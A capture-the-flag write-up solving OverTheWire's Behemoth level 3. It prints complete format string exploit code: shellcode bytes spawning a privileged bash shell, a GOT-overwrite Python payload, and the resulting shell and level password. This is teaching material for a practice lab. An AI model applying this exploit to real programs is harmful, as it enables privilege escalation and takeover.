__Behemoth :: Level 3__
================


_John Hammond_ | Monday, January 18th, 2016_ 


> There is no information for this level, intentionally.


----------


Start by [`ssh`][ssh]ing into the level. Supply the password you retrieved in the previous level.

```
ssh behemoth3@behemoth.labs.overthewire.org
```


`cd` into `/behemoth/` as necessary, to see the files for this level.

The new program we will be working with in this level is `behemoth3`. Let's run it, just to see what it does.

```
./behemoth3
Identify yourself: John
Welcome, John

aaaand goodbye again.
```

It looks like it prompted us for input; I just entered my name, and then the program closed. Hmm, okay... let's run [`ltrace`][ltrace] and see what it actually does.

```
$ ltrace ./behemoth3
__libc_start_main(0x804847d, 1, 0xffffd754, 0x80484e0 <unfinished ...>
printf("Identify yourself: ")                                    = 19
fgets(Identify yourself: John
"John\n", 200, 0xf7fcbc20)                                 = 0xffffd5e8
printf("Welcome, ")                                              = 9
printf("John\n"Welcome, John
)                                                 = 5
puts("\naaaand goodbye again."
aaaand goodbye again.
)                                  = 23
+++ exited (status 0) +++
```

Here I entered "John" again; and if you look through all of the functions it calls and kind of walk throuhgh the program, it looks like... it calls [`printf`][printf] with only our input filled in. It doesn't look like there are any other [arguments] passed to [`printf`][printf].

__That sounds awfully a lot like a [format string vulnerability]!__

If you haven't heard of those vulnerabilities, I obviously recommend you read up on it; but we can exploit it. With that [`printf`][printf] function call in [C], when it has no other [arguments] other than a variable we supply, we can abuse it leak information off [the stack]. All we have to do is send it some [`printf`][printf] [format specifiers].

Let's test our hypothesis by entering some of those [format specifiers]...

```
$ ./behemoth3
Identify yourself: %p %p %p %p
Welcome, 0xc8 0xf7fcbc20 0xf7ff2eb6 0x2

aaaand goodbye again.
```

Here you can see I entered four `%p` [format specifiers], to try and read pointers off [the stack]. And, just as we predicted, we got results reading off [the stack]!

If you don't understand what is happening here, understand that the [`printf`][printf] function in [C] typically _expects_ other [arguments] to be passed to it, and that data will be "formatted" with those given [format specifiers] to be properly printed to the screen. If it is not given any other parameters, though, but it _is_ given [format specificers], it will be forced to use the data left on [the stack].  You can probably get a better grasp on this if you do a bit more reading on [format string]s. 

At this point, though, we've identified a vulnerability; now we just have to exploit it.

The common technique with [format string vulnerabilties][format string vulnerability] is using the other [format specifiers] that [`printf`][printf] offers to actually write to a location in memory. If we did that, we could inject [shellcode], and make the program do whatever we want... like give us a [shell]!

We would essentially replace one address of a function in the program with the location of our own [shellcode], so we kind of corrupt the [call stack]. 

Before we get any further, though, we should find where _our input_ actually lives on the stack. We can do that by supplying some garbage data in the front of our input and then throwing more and more `%p` [format specifiers] at it until we see our garbage data poke its head.

```
$ ./behemoth3
Identify yourself: AAAA %p %p %p %p
Welcome, AAAA 0xc8 0xf7fcbc20 0xf7ff2eb6 0x2 0xf7ffd000

aaaand goodbye again.
```

Just like that -- we'll see our original input, and the pieces of [the stack]... now we just have to "climb" the stack until we see our data. I'll try it again...

```
$ ./behemoth3
Identify yourself: AAAA %p %p %p %p %p %p %p %p %p %p %p %p
Welcome, AAAA 0xc8 0xf7fcbc20 0xf7ff2eb6 0x2 0xf7ffd000 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070

aaaand goodbye again.
```

There, I gave it a lot more [format specificers] this time. And I see our data... __that `0x41414141`!__ Don't forget that `A` is `41` in [hex]. Let's count how many "places" in that is in [the stack]... count the occurences of the `0x` [hex] identifier until we get to our data, `0x41414141`. It occurs at the __6th__ place in.

Now we know _where_ in [the stack] our input starts. You can even the `%p` in there, too ... that's all those repeating `0x207025` segments. :)

Okay, now let's start that start that process of finding an address to overwrite and exploit. First, let's [disassemble] the program to understand it a bit more in-depth.

```
$ objdump -D behemoth3 | less
```

I [pipe] it to [`less`][less] so we can scroll through it and search. I hit the `/` forward slash key to search for the `main` function...

```
0804847d <main>:
 804847d:       55                      push   %ebp
 804847e:       89 e5                   mov    %esp,%ebp
 8048480:       83 e4 f0                and    $0xfffffff0,%esp
 8048483:       81 ec e0 00 00 00       sub    $0xe0,%esp
 8048489:       c7 04 24 70 85 04 08    movl   $0x8048570,(%esp)
 8048490:       e8 9b fe ff ff          call   8048330 <printf@plt>
 8048495:       a1 a4 97 04 08          mov    0x80497a4,%eax
 804849a:       89 44 24 08             mov    %eax,0x8(%esp)
 804849e:       c7 44 24 04 c8 00 00    movl   $0xc8,0x4(%esp)
 80484a5:       00 
 80484a6:       8d 44 24 18             lea    0x18(%esp),%eax
 80484aa:       89 04 24                mov    %eax,(%esp)
 80484ad:       e8 8e fe ff ff          call   8048340 <fgets@plt>
 80484b2:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
 80484b9:       e8 72 fe ff ff          call   8048330 <printf@plt>
 80484be:       8d 44 24 18             lea    0x18(%esp),%eax
 80484c2:       89 04 24                mov    %eax,(%esp)
 80484c5:       e8 66 fe ff ff          call   8048330 <printf@plt>
 80484ca:       c7 04 24 8e 85 04 08    movl   $0x804858e,(%esp)
 80484d1:       e8 7a fe ff ff          call   8048350 <puts@plt>
 80484d6:       b8 00 00 00 00          mov    $0x0,%eax
 80484db:       c9                      leave  
 80484dc:       c3                      ret    
 80484dd:       66 90                   xchg   %ax,%ax
 80484df:       90                      nop
```

Reading through this [Assembly] code (the `call` instructions are really the important stuff to us right now), we can see the same functions called that we saw with [`ltrace`][ltrace]. 

It looks like right after it displays our input with the vulnerable [`print`][printf] function call, it calls [`puts`][puts], another [C] function. Maybe that could be our target!

If we inject [shellcode], and _overwrite_ the address of the [`puts`][puts] function with the location of _our_ shellcode, it will reroute the program and make it do whatever we want. 

So to do that, we need to know the location of the [`puts`][puts] function in memory. Let's search for it in our [disassembly]. Within our [`less`][less] output, I hit the `Home` key to get to the start of the output and then the `/` forward slash again to start to search for `puts`.

```
08048350 <puts@plt>:
 8048350:       ff 25 90 97 04 08       jmp    *0x8049790
 8048356:       68 10 00 00 00          push   $0x10
 804835b:       e9 c0 ff ff ff          jmp    8048320 <_init+0x28>
```

Okay, in this section, we can see the [`puts`][puts] section within the [PLT], the [Procedure Linkage Table]. If you've never ever seen this before or even heard of it, __that's okay__. It is just "used to call functions whose address isn't known in the time of linking (part of compiling the program), and is left to be resolved by the dynamic linker at run time."


With it's entry in the [disassembly], we can see where it actually jumps to in order to really run the function. You can see it after the `jmp` instruction, right in the first line: __our address is `0x8049790`.__

Now that we have the address we want to overwrite, we have to actually overwrite it. How are we going to do that, you ask? Well, with the same [`printf`][printf] vulnerability. [`printf`][printf] even has [format specifiers] to [__write numbers to memory!__](https://www.lix.polytechnique.fr/~liberti/public/computing/prog/c/C/FUNCTIONS/format.html) Even [identifiers][format specifiers] to pad our input to be a certain size (since the size of the input is what will be written to memory).

We've got all the ingredients, we just have to cook up the exploit. [You should do a bit more reading on this][format string], because I'll probably do a bad job of explaining it and I won't fully explain what all of these identifiers do... but anyway, let's start to build the payload.

-----------------------------


The form of the exploit for any [format string] exploit will be like this:

```
<address><address+2>%<number>x%<offset>$hn%<other number>x%<offset+1>$hn
```

'Address' will be the address we write to write to. In our case, that is `0x8049790`, like we discovered earlier. Since we want to completely clobber that whole address, we have to write to it in two parts (to cover the first half, `0x9790` and the second half, `0x0804`... _don't forget things are backwards and weird because of little-[endianness]!_); that's why we actually include another address, 'address+2' so we can write to the second half. 

'Number' will be the new number that will translate to the [hex] value of the new memory address we want to write, the one we are overwriting the _original_ address with. We'll enter it in decimal, but it's really going to be interpreted as [hex] since it will be used as a memory address. 'Number' will refer to the _first half_ of the memory address (like `0x9790` for our _original_) and then 'other number' will refer to the _second half_ (like `0x0804` for our _original_).

The 'x' that follows the 'number' means that the input will be padded to be the 'number's size. And that's what the '%' in front of the 'number' means, too -- it is part of the syntax to pad the input.

The 'offset' that follows is the "place" that our input lies in [the stack]. We already discovered that to be `6`, so we've got those two spots covered.

And finally the '$hn' that ends both sections is part of the [format specifier] syntax to write to memory. 

Again, my explanation probably really sucks (but hopefully it will be more clear as you read on), so I recommend you research and learn a bit more from other sources.

-----------------------------

Now let's write this exploit. I'm going to do in [Python] to keep myself relatively sane... and I'll try and piece it all together just like it follows the form given above. (__At this point I moved into a `[/tmp`][tmp] directory so I could work, save my exploit script anything else I may need__)

Here's my code so far:

``` python
#!/usr/bin/env python

import struct

memory_location = 0x08049790

# I do this to convert the hex into a string...
address = struct.pack( "<I", memory_location )
address2 = struct.pack( "<I", memory_location + 2 )

offset = 6
offset2 = offset + 1

```

Okay, so we've got _some_ of the ingredients for the recipe. But we're missing the 'number' part, the actual new location of our injected [shellcode].

That's because we have to actually add the [shellcode] in and figure out the memory address of it. 

So I used [shellcode] out of the [database](../../shell-storm/) we've put together, [one that runs `execve('/bin/bash', ['/bin/bash', '-p'], NULL)`](../../shell-storm/Linux/x86/execve(-bin-bash,_[-bin-sh,_-p],_NULL).c) on [Linux]. I recommend you do the same.

And the way I loaded it into memory was actually by setting it as an [environment variable], since those are all loaded into any program that runs. That way it exists in the program's memory. Then I used another small tool, [`getenvaddr`][getenvaddr], which would find the address in the program's memory based off the name I gave the [environment variable].

You'll need to create a file for the source code of [`getenvaddr`][getenvaddr] and [compile] it on the [Behemoth] box. Here's the source:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
        }

        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf("%s will be at %p\n", argv[1], ptr);
}
```

Compile with...

```
$ gcc getenvaddr.c -m32 -o getenvaddr
```

At this point we can store our [shellcode] in an [environment variable] and find its address. 

I create the [shellcode] with some [Python], so the [hex] values will actually become the [binary data] it needs to be.

```
$ export PWN=`python -c "print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'"`
$ echo $PWN
j
 X�Rfh-p��Rjhh/bash/bin��RQS��̀
$ ./getenvaddr PWN /behemoth/behemoth3
PWN will be at 0xffffdee6
```

Awesome! Now we've got the memory address we need to jump to: `0xffffdee6`. __Note that this memory address will very likely be different for you; but that is just fine, you will work with it the same way I do.__ With that information, we can figure out the last two 'numbers' we need as ingredients for our exploit.

Now remember, we're doing this in two parts, to get both "halves" of the memory address overwritten. So we'll cut our new memory address into those two parts: `0xdee6` is our "first half" and `0xffff` is our "second half".

To get the 'numbers' for this in order to properly pad our input, we'll have to do some math. I'll write this out in a [Python] interpreter so you can see it all happen:

``` python
>>> 0xdee6 # Let's start with our "first half"...
57062
>>> # Now we have that hex number in decimal, awesome. But we need to subtract
>>> # out the length of things we have already written... just our addresses!
>>> # Since those two addresses add up to 8 bytes, we'll subtract 8.
>>> 57062 - 8
57054
>>> # This is our first number! We'll include this in the exploit script.
>>> # Now let's move on to the next half, our "second half"...
>>> 0xffff
65535
>>> # Again, we have to subtract the length of everything we have already 
>>> # written. Now it is the 57054, and the 8 from the addresses... so it
>>> # is just our original difference, 57062. Subtract those out:
>>> 65535 - 57062
8473
>>> # And we've got our second number! That's all we need!
```

-----

With all that math done, we should have everything to finish our exploit script.

Let's go back to and start to piece together the final payload. I do some weird [Python] stuff just to visualize how they all come together; but it really just creates one long string with all the components put together.


``` python
#!/usr/bin/env python

import struct

memory_location = 0x08049790

# I do this to convert the hex into a string...
address = struct.pack( "<I", memory_location )
address2 = struct.pack( "<I", memory_location + 2 )

offset = 6
offset2 = offset + 1

# decimal values found by new address 0xffffdee6...
number = 57054
number2 = 8473

# Final payload form should be...
# <address><address+2>%<number>x%<offset>$hn%<other number>x%<offset+1>$hn

payload = "".join([
		
    address, address2, "%", str(number), "x%", str(offset), "$hn%", str(number2), "x%", str(offset2), "$hn"

])

print payload
```

That looks good to me. Obviously the memory address may be different for you, so fill in the numbers you need based off your previous math. 

Now, this [Python] script should throw our exploit out to [standard output]. We'll have to [pipe] it to the [standard input] of this level's program. Let's try it.

```
$ python exploit.py | /behemoth/behemoth3
```

Woah, at least on my end, we got a bunch of whitespace and then the program suddenly closed. Did we get our [shell]?

This is a common thing, so always keep it in mind... your may shell have opened, but immediately closed. Try and catch the interaction by batching your exploit and [`cat`][cat].

```
$ ( python exploit.py ; cat ) | /behemoth/behemoth3
```

We still get that spew of whitespace, but the program didn't close... can we type anything?

```
whoami
behemoth4

```

___We got it!___

Let's snag the password.

```
cat /etc/behemoth_pass/behemoth4
ietheishei
```

And we've won another battle against the [Behemoth]!

---------

Note
----

I know that this was a very long writeup, much like [level1](../level1). This is getting to more in-depth stuff; but keep practicing, keep reading, and keep poking around. Grok this process and keep this writeup as a reference. It took me a month to finally solve this challenge and understand it; but now that I've written it all down and can share the process with others, I feel much more confident with it. 

As per usual, my only lesson that comes with saying all this is: __[try harder]__.

__The password for behemoth4 is `ietheishei`.__

[netcat]: https://en.wikipedia.org/wiki/Netcat
[Wikipedia]: https://www.wikipedia.org/
[Linux]: https://www.linux.com/
[man page]: https://en.wikipedia.org/wiki/Man_page
[PuTTY]: http://www.putty.org/
[ssh]: https://en.wikipedia.org/wiki/Secure_Shell
[Windows]: http://www.microsoft.com/en-us/windows
[virtual machine]: https://en.wikipedia.org/wiki/Virtual_machine
[operating system]:https://en.wikipedia.org/wiki/Operating_system
[OS]: https://en.wikipedia.org/wiki/Operating_system
[VMWare]: http://www.vmware.com/
[VirtualBox]: https://www.virtualbox.org/
[hostname]: https://en.wikipedia.org/wiki/Hostname
[port number]: https://en.wikipedia.org/wiki/Port_%28computer_networking%29
[distribution]:https://en.wikipedia.org/wiki/Linux_distribution
[Ubuntu]: http://www.ubuntu.com/
[ISO]: https://en.wikipedia.org/wiki/ISO_image
[standard streams]: https://en.wikipedia.org/wiki/Standard_streams
[standard output]: https://en.wikipedia.org/wiki/Standard_streams
[standard input]: https://en.wikipedia.org/wiki/Standard_streams
[read]: http://ss64.com/bash/read.html
[variable]: https://en.wikipedia.org/wiki/Variable_%28computer_science%29
[command substitution]: http://www.tldp.org/LDP/abs/html/commandsub.html
[permissions]: https://en.wikipedia.org/wiki/File_system_permissions
[redirection]: http://www.tldp.org/LDP/abs/html/io-redirection.html
[pipe]: http://www.tldp.org/LDP/abs/html/io-redirection.html
[piping]: http://www.tldp.org/LDP/abs/html/io-redirection.html
[tmp]: http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/tmp.html
[curl]: http://curl.haxx.se/
[cl1p.net]: https://cl1p.net/
[request]: http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html
[POST request]: https://en.wikipedia.org/wiki/POST_%28HTTP%29
[Python]: http://python.org/
[interpreter]: https://en.wikipedia.org/wiki/List_of_command-line_interpreters
[requests]: http://docs.python-requests.org/en/latest/
[urllib]: https://docs.python.org/2/library/urllib.html
[file handling with Python]: https://docs.python.org/2/tutorial/inputoutput.html#reading-and-writing-files
[bash]: https://www.gnu.org/software/bash/
[Assembly]: https://en.wikipedia.org/wiki/Assembly_language
[the stack]:  https://en.wikipedia.org/wiki/Stack_%28abstract_data_type%29
[register]: http://www.tutorialspoint.com/assembly_programming/assembly_registers.htm
[hex]: https://en.wikipedia.org/wiki/Hexadecimal
[hexadecimal]: https://en.wikipedia.org/wiki/Hexadecimal
[archive file]: https://en.wikipedia.org/wiki/Archive_file
[zip file]: https://en.wikipedia.org/wiki/Zip_%28file_format%29
[zip files]: https://en.wikipedia.org/wiki/Zip_%28file_format%29
[.zip]: https://en.wikipedia.org/wiki/Zip_%28file_format%29
[gigabytes]: https://en.wikipedia.org/wiki/Gigabyte
[GB]: https://en.wikipedia.org/wiki/Gigabyte
[GUI]: https://en.wikipedia.org/wiki/Graphical_user_interface
[Wireshark]: https://www.wireshark.org/
[FTP]: https://en.wikipedia.org/wiki/File_Transfer_Protocol
[client and server]: https://simple.wikipedia.org/wiki/Client-server
[RETR]: http://cr.yp.to/ftp/retr.html
[FTP server]: https://help.ubuntu.com/lts/serverguide/ftp-server.html
[SFTP]: https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol
[SSL]: https://en.wikipedia.org/wiki/Transport_Layer_Security
[encryption]: https://en.wikipedia.org/wiki/Encryption
[HTML]: https://en.wikipedia.org/wiki/HTML
[Flask]: http://flask.pocoo.org/
[SQL]: https://en.wikipedia.org/wiki/SQL
[and]: https://en.wikipedia.org/wiki/Logical_conjunction
[Cyberstakes]: https://cyberstakesonline.com/
[cat]: https://en.wikipedia.org/wiki/Cat_%28Unix%29
[symbolic link]: https://en.wikipedia.org/wiki/Symbolic_link
[ln]: https://en.wikipedia.org/wiki/Ln_%28Unix%29
[absolute path]: https://en.wikipedia.org/wiki/Path_%28computing%29
[CTF]: https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security
[Cyberstakes]: https://cyberstakesonline.com/
[OverTheWire]: http://overthewire.org/
[Leviathan]: http://overthewire.org/wargames/leviathan/
[ls]: https://en.wikipedia.org/wiki/Ls
[grep]: https://en.wikipedia.org/wiki/Grep
[strings]: http://linux.die.net/man/1/strings
[ltrace]: http://linux.die.net/man/1/ltrace
[C]: https://en.wikipedia.org/wiki/C_%28programming_language%29
[strcmp]: http://linux.die.net/man/3/strcmp
[access]: http://pubs.opengroup.org/onlinepubs/009695399/functions/access.html
[system]: http://linux.die.net/man/3/system
[real user ID]: https://en.wikipedia.org/wiki/User_identifier
[effective user ID]: https://en.wikipedia.org/wiki/User_identifier
[brute force]: https://en.wikipedia.org/wiki/Brute-force_attack
[for loop]: https://en.wikipedia.org/wiki/For_loop
[bash programming]: http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
[Behemoth]: http://overthewire.org/wargames/behemoth/
[command line]: https://en.wikipedia.org/wiki/Command-line_interface
[command-line]: https://en.wikipedia.org/wiki/Command-line_interface
[cli]: https://en.wikipedia.org/wiki/Command-line_interface
[PHP]: https://php.net/
[URL]: https://en.wikipedia.org/wiki/Uniform_Resource_Locator
[TamperData]: https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
[Firefox]: https://www.mozilla.org/en-US/firefox/new/?product=firefox-3.6.8&os=osx%E2%8C%A9=en-US
[Caesar Cipher]: https://en.wikipedia.org/wiki/Caesar_cipher
[Google Reverse Image Search]: https://www.google.com/imghp
[PicoCTF]: https://picoctf.com/
[PicoCTF 2014]: https://picoctf.com/
[JavaScript]: https://www.javascript.com/
[base64]: https://en.wikipedia.org/wiki/Base64
[client-side]: https://en.wikipedia.org/wiki/Client-side_scripting
[client side]: https://en.wikipedia.org/wiki/Client-side_scripting
[javascript:alert]: http://www.w3schools.com/js/js_popup.asp
[Java]: https://www.java.com/en/
[2147483647]: https://en.wikipedia.org/wiki/2147483647_%28number%29
[XOR]: https://en.wikipedia.org/wiki/Exclusive_or
[XOR cipher]: https://en.wikipedia.org/wiki/XOR_cipher
[quipqiup.com]: http://www.quipqiup.com/
[PDF]: https://en.wikipedia.org/wiki/Portable_Document_Format
[pdfimages]: http://linux.die.net/man/1/pdfimages
[ampersand]: https://en.wikipedia.org/wiki/Ampersand
[URL encoding]: https://en.wikipedia.org/wiki/Percent-encoding
[Percent encoding]: https://en.wikipedia.org/wiki/Percent-encoding
[URL-encoding]: https://en.wikipedia.org/wiki/Percent-encoding
[Percent-encoding]: https://en.wikipedia.org/wiki/Percent-encoding
[endianness]: https://en.wikipedia.org/wiki/Endianness
[ASCII]: https://en.wikipedia.org/wiki/ASCII
[struct]: https://docs.python.org/2/library/struct.html
[pcap]: https://en.wikipedia.org/wiki/Pcap
[packet capture]: https://en.wikipedia.org/wiki/Packet_analyzer
[HTTP]: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol
[Wireshark filters]: https://wiki.wireshark.org/DisplayFilters
[SSL]: https://en.wikipedia.org/wiki/Transport_Layer_Security
[Assembly]: https://en.wikipedia.org/wiki/Assembly_language
[Assembly Syntax]: https://en.wikipedia.org/wiki/X86_assembly_language#Syntax
[Intel Syntax]: https://en.wikipedia.org/wiki/X86_assembly_language
[Intel or AT&T]: http://www.imada.sdu.dk/Courses/DM18/Litteratur/IntelnATT.htm
[AT&T syntax]: https://en.wikibooks.org/wiki/X86_Assembly/GAS_Syntax
[GET request]: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods
[GET requests]: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods
[IP Address]: https://en.wikipedia.org/wiki/IP_address
[IP Addresses]: https://en.wikipedia.org/wiki/IP_address
[MAC Address]: https://en.wikipedia.org/wiki/MAC_address
[session]: https://en.wikipedia.org/wiki/Session_%28computer_science%29
[Cookie Manager+]: https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/
[hexedit]: http://linux.die.net/man/1/hexedit
[Google]: http://google.com/
[Scapy]: http://www.secdev.org/projects/scapy/
[ARP]: https://en.wikipedia.org/wiki/Address_Resolution_Protocol
[UDP]: https://en.wikipedia.org/wiki/User_Datagram_Protocol
[SQL injection]: https://en.wikipedia.org/wiki/SQL_injection
[sqlmap]: http://sqlmap.org/
[sqlite]: https://www.sqlite.org/
[MD5]: https://en.wikipedia.org/wiki/MD5
[OpenSSL]: https://www.openssl.org/
[Burpsuite]:https://portswigger.net/burp/
[Burpsuite.jar]:https://portswigger.net/burp/
[Burp]:https://portswigger.net/burp/
[NULL character]: https://en.wikipedia.org/wiki/Null_character
[Format String Vulnerability]: http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
[printf]: http://pubs.opengroup.org/onlinepubs/009695399/functions/fprintf.html
[argument]: https://en.wikipedia.org/wiki/Parameter_%28computer_programming%29
[arguments]: https://en.wikipedia.org/wiki/Parameter_%28computer_programming%29
[parameter]: https://en.wikipedia.org/wiki/Parameter_%28computer_programming%29
[parameters]: https://en.wikipedia.org/wiki/Parameter_%28computer_programming%29
[Vortex]: http://overthewire.org/wargames/vortex/
[socket]: https://docs.python.org/2/library/socket.html
[file descriptor]: https://en.wikipedia.org/wiki/File_descriptor
[file descriptors]: https://en.wikipedia.org/wiki/File_descriptor
[Forth]: https://en.wikipedia.org/wiki/Forth_%28programming_language%29
[github]: https://github.com/
[buffer overflow]: https://en.wikipedia.org/wiki/Buffer_overflow
[try harder]: https://www.offensive-security.com/when-things-get-tough/
[segmentation fault]: https://en.wikipedia.org/wiki/Segmentation_fault
[seg fault]: https://en.wikipedia.org/wiki/Segmentation_fault
[segfault]: https://en.wikipedia.org/wiki/Segmentation_fault
[shellcode]: https://en.wikipedia.org/wiki/Shellcode
[sploit-tools]: https://github.com/SaltwaterC/sploit-tools
[Kali]: https://www.kali.org/
[Kali Linux]: https://www.kali.org/
[gdb]: https://www.gnu.org/software/gdb/
[gdb tutorial]: http://www.unknownroad.com/rtfm/gdbtut/gdbtoc.html
[payload]: https://en.wikipedia.org/wiki/Payload_%28computing%29
[peda]: https://github.com/longld/peda
[git]: https://git-scm.com/
[home directory]: https://en.wikipedia.org/wiki/Home_directory
[NOP slide]:https://en.wikipedia.org/wiki/NOP_slide
[NOP]: https://en.wikipedia.org/wiki/NOP
[examine]: https://sourceware.org/gdb/onlinedocs/gdb/Memory.html
[stack pointer]: http://stackoverflow.com/questions/1395591/what-is-exactly-the-base-pointer-and-stack-pointer-to-what-do-they-point
[little endian]: https://en.wikipedia.org/wiki/Endianness
[big endian]: https://en.wikipedia.org/wiki/Endianness
[endianness]: https://en.wikipedia.org/wiki/Endianness
[pack]: https://docs.python.org/2/library/struct.html#struct.pack
[ash]:https://en.wikipedia.org/wiki/Almquist_shell
[dash]: https://en.wikipedia.org/wiki/Almquist_shell
[shell]: https://en.wikipedia.org/wiki/Shell_%28computing%29
[pwntools]: https://github.com/Gallopsled/pwntools
[colorama]: https://pypi.python.org/pypi/colorama
[objdump]: https://en.wikipedia.org/wiki/Objdump
[UPX]: http://upx.sourceforge.net/
[64-bit]: https://en.wikipedia.org/wiki/64-bit_computing
[breakpoint]: https://en.wikipedia.org/wiki/Breakpoint
[stack frame]: http://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Mips/stack.html
[format string]: http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
[format specifiers]: http://web.eecs.umich.edu/~bartlett/printf.html
[format specifier]: http://web.eecs.umich.edu/~bartlett/printf.html
[variable expansion]: https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html
[base pointer]: http://stackoverflow.com/questions/1395591/what-is-exactly-the-base-pointer-and-stack-pointer-to-what-do-they-point
[dmesg]: https://en.wikipedia.org/wiki/Dmesg
[Android]: https://www.android.com/
[.apk]:https://en.wikipedia.org/wiki/Android_application_package
[apk]:https://en.wikipedia.org/wiki/Android_application_package
[decompiler]: https://en.wikipedia.org/wiki/Decompiler
[decompile Java code]: http://www.javadecompilers.com/
[jadx]: https://github.com/skylot/jadx
[.img]: https://en.wikipedia.org/wiki/IMG_%28file_format%29
[binwalk]: http://binwalk.org/
[JPEG]: https://en.wikipedia.org/wiki/JPEG
[JPG]: https://en.wikipedia.org/wiki/JPEG
[disk image]: https://en.wikipedia.org/wiki/Disk_image
[foremost]: http://foremost.sourceforge.net/
[eog]: https://wiki.gnome.org/Apps/EyeOfGnome
[function pointer]: https://en.wikipedia.org/wiki/Function_pointer
[machine code]: https://en.wikipedia.org/wiki/Machine_code
[compiled language]: https://en.wikipedia.org/wiki/Compiled_language
[compiler]: https://en.wikipedia.org/wiki/Compiler
[compile]: https://en.wikipedia.org/wiki/Compiler
[scripting language]: https://en.wikipedia.org/wiki/Scripting_language
[shell-storm.org]: http://shell-storm.org/
[shell-storm]:http://shell-storm.org/
[shellcode database]: http://shell-storm.org/shellcode/
[gdb-peda]: https://github.com/longld/peda
[x86]: https://en.wikipedia.org/wiki/X86
[Intel x86]: https://en.wikipedia.org/wiki/X86
[sh]: https://en.wikipedia.org/wiki/Bourne_shell
[/bin/sh]: https://en.wikipedia.org/wiki/Bourne_shell
[SANS]: https://www.sans.org/
[Holiday Hack Challenge]: https://holidayhackchallenge.com/
[USCGA]: http://uscga.edu/
[United States Coast Guard Academy]: http://uscga.edu/
[US Coast Guard Academy]: http://uscga.edu/
[Academy]: http://uscga.edu/
[Coast Guard Academy]: http://uscga.edu/
[Hackfest]: https://www.sans.org/event/pen-test-hackfest-2015
[SSID]: https://en.wikipedia.org/wiki/Service_set_%28802.11_network%29
[DNS]: https://en.wikipedia.org/wiki/Domain_Name_System
[Python:base64]: https://docs.python.org/2/library/base64.html
[OpenWRT]: https://openwrt.org/
[node.js]: https://nodejs.org/en/
[MongoDB]: https://www.mongodb.org/
[Mongo]: https://www.mongodb.org/
[SuperGnome 01]: http://52.2.229.189/
[Shodan]: https://www.shodan.io/
[SuperGnome 02]: http://52.34.3.80/
[SuperGnome 03]: http://52.64.191.71/
[SuperGnome 04]: http://52.192.152.132/
[SuperGnome 05]: http://54.233.105.81/
[Local file inclusion]: http://hakipedia.com/index.php/Local_File_Inclusion
[LFI]: http://hakipedia.com/index.php/Local_File_Inclusion
[PNG]: http://www.libpng.org/pub/png/
[.png]: http://www.libpng.org/pub/png/
[Remote Code Execution]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
[RCE]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
[GNU]: https://www.gnu.org/
[regular expression]: https://en.wikipedia.org/wiki/Regular_expression
[regular expressions]: https://en.wikipedia.org/wiki/Regular_expression
[uniq]: https://en.wikipedia.org/wiki/Uniq
[sort]: https://en.wikipedia.org/wiki/Sort_%28Unix%29
[binary data]: https://en.wikipedia.org/wiki/Binary_data
[binary]: https://en.wikipedia.org/wiki/Binary
[Firebug]: http://getfirebug.com/
[SHA1]: https://en.wikipedia.org/wiki/SHA-1
[SHA-1]: https://en.wikipedia.org/wiki/SHA-1
[Linux]: https://www.linux.com/
[Ubuntu]: http://www.ubuntu.com/
[Kali Linux]: https://www.kali.org/
[Over The Wire]: http://overthewire.org/wargames/
[OverTheWire]: http://overthewire.org/wargames/
[Micro Corruption]: https://microcorruption.com/
[Smash The Stack]: http://smashthestack.org/
[CTFTime]: https://ctftime.org/
[Writeups]: https://ctftime.org/writeups
[Competitions]: https://ctftime.org/event/list/upcoming
[Skull Security]: https://wiki.skullsecurity.org/index.php?title=Main_Page
[MITRE]: http://mitrecyberacademy.org/
[Trail of Bits]: https://trailofbits.github.io/ctf/
[Stegsolve]: http://www.caesum.com/handbook/Stegsolve.jar
[Steghide]: http://steghide.sourceforge.net/
[IDA Pro]: https://www.hex-rays.com/products/ida/
[Wireshark]: https://www.wireshark.org/
[Bro]: https://www.bro.org/
[Meterpreter]: https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/
[Metasploit]: http://www.metasploit.com/
[Burpsuite]: https://portswigger.net/burp/
[xortool]: https://github.com/hellman/xortool
[sqlmap]: http://sqlmap.org/
[VMWare]: http://www.vmware.com/
[VirtualBox]: https://www.virtualbox.org/wiki/Downloads
[VBScript Decoder]: https://gist.github.com/bcse/1834878
[quipqiup.com]: http://quipqiup.com/
[EXIFTool]: http://www.sno.phy.queensu.ca/~phil/exiftool/
[Scalpel]: https://github.com/sleuthkit/scalpel
[Ryan's Tutorials]: http://ryanstutorials.net
[Linux Fundamentals]: http://linux-training.be/linuxfun.pdf
[USCGA]: http://uscga.edu
[Cyberstakes]: https://cyberstakesonline.com/
[Crackmes.de]: http://crackmes.de/
[Nuit Du Hack]: http://wargame.nuitduhack.com/
[Hacking-Lab]: https://www.hacking-lab.com/index.html
[FlareOn]: http://www.flare-on.com/
[The Second Extended Filesystem]: http://www.nongnu.org/ext2-doc/ext2.html
[GIF]: https://en.wikipedia.org/wiki/GIF
[PDFCrack]: http://pdfcrack.sourceforge.net/index.html
